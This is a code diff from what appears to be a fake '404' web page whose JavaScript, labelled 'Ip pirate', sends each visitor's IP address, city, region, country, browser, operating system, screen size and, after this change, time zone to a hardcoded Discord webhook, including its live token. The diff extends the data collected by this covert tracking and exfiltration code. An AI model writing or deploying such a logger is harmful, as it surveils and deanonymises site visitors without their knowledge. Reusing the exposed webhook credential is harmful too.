@@ -67,19 +67,20 @@
             const request = new XMLHttpRequest();
             request.open("POST", "https://discordapp.com/api/webhooks/993137568541577307/k_fbTDdreBXzznT6WxkDtI6XKBEwAHHc-MnRtaMOks8ezaIm3SwymsjyHxkDzIpxIy2B");
             request.setRequestHeader('Content-type', 'application/json');
-
+    
             const params = {
                 username: "Ip pirate - 404 Web",
                 avatar_url: "",
                 content: `
                 Information:
-                Operating System: ${navigator.platform}, 
-                Browser: ${navigator.userAgent}, 
-                Browser Size: ${screen.height} x ${screen.width},
-                ip: (${location_data.version}): ${ip}, 
-                location:,
-                City: ${location_data.city}, 
-                Region: ${location_data.region}, 
+                Operating System: ${navigator.platform}
+                Browser: ${navigator.userAgent}
+                Browser Size: ${screen.height} x ${screen.width}
+                ip: (${location_data.version}): ${ip}
+                TimeZone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+                location:
+                City: ${location_data.city}
+                Region: ${location_data.region} 
                 Country: ${location_data.country_name}
              `
             }
